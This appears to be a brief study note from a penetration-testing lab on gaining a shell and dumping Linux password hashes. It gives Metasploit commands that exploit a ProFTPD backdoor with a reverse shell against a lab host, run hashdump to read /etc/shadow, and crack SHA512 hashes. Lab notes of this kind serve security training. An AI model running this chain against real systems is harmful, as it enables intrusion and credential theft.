<h2>Password Hashes</h2>
All the information of all the accounts on Linux are stored : /etc/passwd
All the encrypted password of all the accounts on Linus in : /etc/shadow
![[Pasted image 20250916121412.png]]

```
use auxiliary/analyze/crack_linux
use post/linux/gather/hashdump
set session <id>
```

```
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST 192.70.114.2
exploit -z
```

```
sessions -u 1 //upgrade session
```
```
use post/linux/gather/hashdump
set SESSION 1
exploit
```

```
use auxiliary/analyze/crack_linux
set SHA512 true
run
```